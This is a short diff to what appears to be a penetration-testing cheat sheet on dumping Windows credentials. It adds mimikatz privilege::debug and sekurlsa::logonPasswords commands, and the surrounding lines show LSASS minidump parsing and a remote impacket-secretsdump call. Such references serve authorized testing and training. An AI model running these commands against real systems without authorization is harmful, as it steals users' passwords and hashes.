@@ -237,6 +237,11 @@ If disabled:
 
 `C:\> mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit`
 
+### From box
+
+`mimikatz # privilege::debug`
+`mimikatz # sekurlsa::logonPasswords full`
+
 ### Remote
 
 `impacket-secretsdump Administrator@ip`
